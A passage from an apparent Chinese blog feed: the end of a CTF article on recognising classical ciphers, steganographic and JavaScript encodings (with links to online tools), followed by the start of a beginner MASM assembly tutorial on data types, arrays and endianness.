<p>数查询可知它实际上有 87 个字符，多出的字符是由零宽空格实现的编码，因为零宽空格不占据空间，所以看</p>
<p>不出它的存在。</p>
<p><strong>使用</strong>：在进行文本隐藏加密时，将需要隐藏的文字写在括号中，就像这样 “你好（有才华），我好喜欢你（画的画）！”，然后加密即可隐藏括号内的文字。同时可以设定一个密码，这样只有知道密码的人才能</p>
<p>解密隐藏的文字。密码可以是数字、字母和下划线，最多九位。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182746913.png" alt="image-20220329182746913" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEveWluY2FuZ2ppYW1pLnBocA==">https://www.qqxiuzi.cn/bianma/yincangjiami.php</span></p>
<p>这是加密后的字节数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182903057.png" alt="image-20220329182903057" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi96aC96aXNodS16aWppZXNodS8=">https://www.qqxiuzi.cn/zh/zishu-zijieshu/</span></p>
<p>这是本来的字节数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329182933830.png" alt="image-20220329182933830" /></p>
<ol start="2">
<li>零宽隐写</li>
</ol>
<p>特征：解密后明文与密文会分开显示，密文一般隐藏在第一个字后面，不信你试试，保证你十下之内删不完</p>
<p>与上面文本隐藏加密的原理一样，但过程不一样</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183319344.png" alt="image-20220329183319344" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183338774.png" alt="image-20220329183338774" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly95dWFuZnV4LmdpdGh1Yi5pby96ZXJvLXdpZHRoLXdlYi8=">https://yuanfux.github.io/zero-width-web/</span></p>
<p>这里加密过的密文在文本隐藏加密中解不出来</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183517295.png" alt="image-20220329183517295" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEveWluY2FuZ2ppYW1pLnBocA==">https://www.qqxiuzi.cn/bianma/yincangjiami.php</span></p>
<h2 id="特殊暗号类加密"><a class="anchor" href="#特殊暗号类加密">#</a> 特殊暗号类加密</h2>
<p>这类加密都是特征性比较强的，易辨别</p>
<ol>
<li>猪圈密码</li>
</ol>
<p><strong>特点：只能对字母加解密并且符号无法复制，粘贴后会直接显示明文</strong></p>
<p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式</p>
<p>密码，曾经是美国内战时盟军使用的密码，目前仅在密码教学、各种竞赛中使用。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183652549.png" alt="image-20220329183652549" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRvb2xzLmluZm8vY29kZS9jOTAuaHRtbA==">http://www.metools.info/code/c90.html</span></p>
<ol start="2">
<li>与佛论禅</li>
</ol>
<p>特点：就是你看不懂的佛语</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183735539.png" alt="image-20220329183735539" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5rZXlmYy5uZXQvYmJzL3Rvb2xzL3R1ZG91Y29kZS5hc3B4">http://www.keyfc.net/bbs/tools/tudoucode.aspx</span></p>
<ol start="3">
<li>百家姓暗号<br />
特征：不要多说当你看到一串百家姓的时候多半就是这个暗号了</li>
</ol>
<p>当他解密的的时候前面会多一串固定字符</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183917397.png" alt="image-20220329183917397" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWRlYS1zLmNuL2FuaGFv">https://www.idea-s.cn/anhao</span></p>
<ol start="4">
<li>卡尔达诺栅格码</li>
</ol>
<p>特征：把明文伪装成垃圾邮件，看着这么多内容，其实我只是加密了 admin</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329183954098.png" alt="image-20220329183954098" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc3BhbW1pbWljLmNvbS8=">https://www.spammimic.com/</span></p>
<ol start="5">
<li>莫尔斯电码<br />
特征：密文由不规律的.、/、- 组成</li>
</ol>
<p>摩尔斯电码（Morse alphabet）（又译为摩斯电码）是一种时通时断的信号代码，这种信号代码通过不同的</p>
<p>排列顺序来表达不同的英文字母、数字和标点符号等。</p>
<p>由美国人摩尔斯（Samuel Finley Breese Morse）于 1837 年发明，为摩尔斯电报机的发明（1835 年）提供了条件。</p>
<p>摩尔密码加密的字符只有字符，数字，标点，不区分大小写，支持中文汉字</p>
<p>中文摩斯加密解密：本工具摩尔密码加密是互联网上唯一一个可以对中文进行摩斯编码的工具。</p>
<p><strong>莫尔斯电码加密列表 | Morse Code List</strong></p>
<p>一、26 个字母的莫尔斯电码加密</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th>电码符号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">A</td>
<td style="text-align:center">．━</td>
<td style="text-align:center">H</td>
<td style="text-align:center">．．．．</td>
<td style="text-align:center">O</td>
<td style="text-align:center">━ ━ ━</td>
<td style="text-align:center">V</td>
<td>．．．━</td>
</tr>
<tr>
<td style="text-align:center">B</td>
<td style="text-align:center">━ ．．．</td>
<td style="text-align:center">I</td>
<td style="text-align:center">．．</td>
<td style="text-align:center">P</td>
<td style="text-align:center">．━ ━ ．</td>
<td style="text-align:center">W</td>
<td>．━ ━</td>
</tr>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">━ ．━ ．</td>
<td style="text-align:center">J</td>
<td style="text-align:center">．━ ━ ━</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">━ ━ ．━</td>
<td style="text-align:center">X</td>
<td>━ ．．━</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:center">━ ．．</td>
<td style="text-align:center">K</td>
<td style="text-align:center">━ ．━</td>
<td style="text-align:center">R</td>
<td style="text-align:center">．━ ．</td>
<td style="text-align:center">Y</td>
<td>━ ．━ ━</td>
</tr>
<tr>
<td style="text-align:center">E</td>
<td style="text-align:center">．</td>
<td style="text-align:center">L</td>
<td style="text-align:center">．━ ．．</td>
<td style="text-align:center">S</td>
<td style="text-align:center">．．．</td>
<td style="text-align:center">Z</td>
<td>━ ━ ．．</td>
</tr>
<tr>
<td style="text-align:center">F</td>
<td style="text-align:center">．．━ ．</td>
<td style="text-align:center">M</td>
<td style="text-align:center">━ ━</td>
<td style="text-align:center">T</td>
<td style="text-align:center">━</td>
<td style="text-align:center"></td>
<td></td>
</tr>
<tr>
<td style="text-align:center">G</td>
<td style="text-align:center">━ ━ ．</td>
<td style="text-align:center">N</td>
<td style="text-align:center">━ ．</td>
<td style="text-align:center">U</td>
<td style="text-align:center">．．━</td>
<td style="text-align:center"></td>
<td></td>
</tr>
</tbody>
</table>
<p>二、数字的莫尔斯电码加密</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">━ ━ ━ ━ ━</td>
<td style="text-align:center">3</td>
<td style="text-align:center">．．．━ ━</td>
<td style="text-align:center">6</td>
<td style="text-align:center">━ ．．．．</td>
<td style="text-align:center">9</td>
<td style="text-align:center">━ ━ ━ ━ ．</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">．━ ━ ━ ━</td>
<td style="text-align:center">4</td>
<td style="text-align:center">．．．．━</td>
<td style="text-align:center">7</td>
<td style="text-align:center">━ ━ ．．．</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">．．━ ━ ━</td>
<td style="text-align:center">5</td>
<td style="text-align:center">．．．．．</td>
<td style="text-align:center">8</td>
<td style="text-align:center">━ ━ ━ ．．</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>三、标点符号的莫尔斯电码加密</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
<th style="text-align:center">字符</th>
<th style="text-align:center">电码符号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">．━ ．━ ．━</td>
<td style="text-align:center">:</td>
<td style="text-align:center">━ ━ ━ ．．．</td>
<td style="text-align:center">,</td>
<td style="text-align:center">━ ━ ．．━ ━</td>
<td style="text-align:center">;</td>
<td style="text-align:center">━ ．━ ．━ ．</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">．．━ ━ ．．</td>
<td style="text-align:center">=</td>
<td style="text-align:center">━ ．．．━</td>
<td style="text-align:center">’</td>
<td style="text-align:center">．━ ━ ━ ━ ．</td>
<td style="text-align:center">/</td>
<td style="text-align:center">━ ．．━ ．</td>
</tr>
<tr>
<td style="text-align:center">!</td>
<td style="text-align:center">━ ．━ ．━ ━</td>
<td style="text-align:center">━</td>
<td style="text-align:center">━ ．．．．━</td>
<td style="text-align:center">_</td>
<td style="text-align:center">．．━ ━ ．━</td>
<td style="text-align:center">&quot;</td>
<td style="text-align:center">．━ ．．━ ．</td>
</tr>
<tr>
<td style="text-align:center">(</td>
<td style="text-align:center">━ ．━ ━ ．</td>
<td style="text-align:center">)</td>
<td style="text-align:center">━ ．━ ━ ．━</td>
<td style="text-align:center">$</td>
<td style="text-align:center">．．．━ ．．━</td>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">． ．．．</td>
</tr>
<tr>
<td style="text-align:center">@</td>
<td style="text-align:center">．━ ━ ．━ ．</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329184941550.png" alt="image-20220329184941550" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXRvb2w5OS5jb20vbW9yc2UucGhw">https://www.atool99.com/morse.php</span></p>
<ol start="6">
<li>Quoted-Printable</li>
</ol>
<p>这种编码常用与邮件处理，只能对汉字进行编码，特征是 = 加两个大写字母或数字组合</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185103127.png" alt="image-20220329185103127" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5teGN6Lm5ldC90b29scy9RdW90ZWRQcmludGFibGUuYXNweA==">http://www.mxcz.net/tools/QuotedPrintable.aspx</span></p>
<ol start="7">
<li>ROT13</li>
</ol>
<p><strong>特征：它与凯撒密码差不多都是字母替换，你看到一句特别奇怪的语句可能就是它编码的</strong></p>
<p>ROT13（回转 13 位，Template:lang，有时中间加了个减号称作 ROT-13）是一种简易的置换暗码。它是一种在</p>
<p>网路论坛用作隐藏八卦（spoiler）、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆</p>
<p>一瞥。ROT13 被描述成「杂志字谜上下颠倒解答的 Usenet 对等体」（Usenet equivalent of a magazine printing</p>
<p>the answer to a quiz upside down.）Template:cite web ROT13 也是过去在古罗马开发的凯撒加密的一种变体。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185247585.png" alt="image-20220329185247585" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5teGN6Lm5ldC90b29scy9yb3QxMy5hc3B4">http://www.mxcz.net/tools/rot13.aspx</span></p>
<ol start="8">
<li>文本加密为汉字</li>
</ol>
<p><strong>特征：将明文加密成各种繁体字后面带俩等号</strong></p>
<p>它不仅可以加密成汉字，还可以加密成以下几种类型</p>
<p>比如这样：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185336830.png" alt="image-20220329185336830" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VuYmVuamlhbWkucGhw">https://www.qqxiuzi.cn/bianma/wenbenjiami.php</span></p>
<h2 id="js专用加密"><a class="anchor" href="#js专用加密">#</a> js 专用加密</h2>
<ol>
<li>颜文字 js 加密</li>
</ol>
<p>特征：一堆颜文字构成的 js 代码，在 F12 中可直接解密执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185433044.png" alt="image-20220329185433044" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly91dGYtOC5qcC9wdWJsaWMvYWFlbmNvZGUuaHRtbA==">https://utf-8.jp/public/aaencode.html</span></p>
<ol start="2">
<li>jother 编码</li>
</ol>
<p>特征：只用！+ () [] { } 这八个字符就能完成对任意字符串的编码。也可在 F12 中解密执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185753020.png" alt="image-20220329185753020" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cHM6Ly92dWxzZWUuY29tL3Rvb2xzL2pvdGhlci9pbmRleC5odG0=">https://vulsee.com/tools/jother/index.htm</span></p>
<ol start="3">
<li>JSFuck 编码</li>
</ol>
<p>特征：与 jother 很像，只是少了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220329185902373.png" alt="image-20220329185902373" /></p>
<p>在线网站：<span class="exturl" data-url="aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==">http://www.jsfuck.com/</span></p>
<p><strong>参考</strong>：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS91XzE1Mjc0OTQ5LzI5MzE1ODk=">30 余种加密编码类型的密文特征分析（建议收藏）</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之定义数据类型和数据传送指令学习</title>
    <url>/article/1c336d24.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/3893ead1f7e49ff9f0018e63d94d21d.jpg" alt="image-3893ead1f7e49ff9f0018e63d94d21d" /></p>
<h2 id="定义数据类型"><a class="anchor" href="#定义数据类型">#</a> 定义数据类型</h2>
<h3 id="内部数据类型"><a class="anchor" href="#内部数据类型">#</a> 内部数据类型</h3>
<h4 id="整数"><a class="anchor" href="#整数">#</a> 整数</h4>
<ul>
<li>BYTE 8 位（无符号）</li>
<li>SBYTE 8 位（有符号）</li>
<li>WORD 16 位（无符号）</li>
<li>SWORD 16 位（有符号）</li>
<li>DWORD 32 位（无符号）</li>
<li>SDWORD 32 位（有符号）</li>
<li>FWORD 48 位 保护模式中的远指针</li>
<li>QWORD 64 位 整数</li>
<li>TBYTE 80 位 整数</li>
</ul>
<h4 id="实数"><a class="anchor" href="#实数">#</a> 实数</h4>
<ul>
<li>REAL4 32 位 短实数</li>
<li>REAL8 64 位 长实数</li>
<li>REAL10 80 位 扩展实数</li>
</ul>
<h4 id="伪指令"><a class="anchor" href="#伪指令">#</a> 伪指令</h4>
<ul>
<li>db 8 位整数 相当于 C 语言中的 char 可以用来保存 ASCII</li>
<li>dw 16 位整数</li>
<li>dd 32 位 整数或实数</li>
<li>dq 64 位 整数或实数</li>
<li>dt 80 位 整数</li>
</ul>
<p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	add eax<span class="token punctuation">,</span>num</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="27"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="28"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="29"></td><td><pre>END main</pre></td></tr></table></figure><p>运行结果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123195729201.png" alt="image-20220123195729201" /></p>
<p>定义数组类型</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="2"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>代码块填写格式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="3"></td><td><pre>mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr></table></figure><p>测试样例</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>运行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123200540676.png" alt="image-20220123200540676" /></p>
<h3 id="大端序与小端序"><a class="anchor" href="#大端序与小端序">#</a> 大端序与小端序</h3>
<p>计算机硬件有两种储存数据的方式：大端字节序（big endian）和小端字节序（little endian）。</p>
<blockquote>
<ul>
<li>大端字节序：高位字节在前，低位字节在后</li>
<li>小端字节序：低位字节在前，高位字节在后</li>
</ul>
</blockquote>
<p>下面举例说明</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>sz <span class="token operator">=</span> <span class="token string">"my name is 21r000!"</span></pre></td></tr><tr><td data-num="16"></td><td><pre>szStr db <span class="token string">"my name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span>字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>num dword <span class="token number">5</span><span class="token punctuation">;</span>整数型</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span>数组</pre></td></tr><tr><td data-num="19"></td><td><pre>arrNum dword <span class="token number">20</span> <span class="token function">dup</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">;</span><span class="token operator">=</span>arrNum<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="23"></td><td><pre>main proc</pre></td></tr><tr><td data-num="24"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">01234567</span>h</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">11111111</span>h</pre></td></tr><tr><td data-num="26"></td><td><pre>	mov <span class="token punctuation">[</span>arrNum <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">22222222</span>h</pre></td></tr><tr><td data-num="27"></td><td><pre>	push offset szStr</pre></td></tr><tr><td data-num="28"></td><td><pre>	call crt_printf</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="31"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="32"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="33"></td><td><pre>END main</pre></td></tr></table></figure><p>测试运行后，取地址查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123201813924.png" alt="image-20220123201813924" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123201932890.png" alt="image-20220123201932890" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123202447990.png" alt="image-20220123202447990" /></p>
<p>可以发现是按低位字节在前，高位字节在后的方式排序，即： <code>67 45 23 01</code>  的格式。这种称为<strong>小端序</strong>；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220123203446973.png" alt="image-20220123203446973" /></p>
<p>而如果像我们正常数数的方式排列的，如： <code>01 23 45 67</code>  的格式，则称为<strong>大端序</strong>。所以也称大端序是人类读写数值的方法。</p>
<h2 id="数据传送指令"><a class="anchor" href="#数据传送指令">#</a> 数据传送指令</h2>
<h3 id="操作数类型"><a class="anchor" href="#操作数类型">#</a> 操作数类型</h3>
<ul>
<li>立即数：0，1，2，3，4，5，6，7，8，9 等</li>
<li>寄存器操作数 eax，ebx</li>
<li>内存操作数</li>
</ul>
<h3 id="寄存器操作数"><a class="anchor" href="#寄存器操作数">#</a> 寄存器操作数</h3>
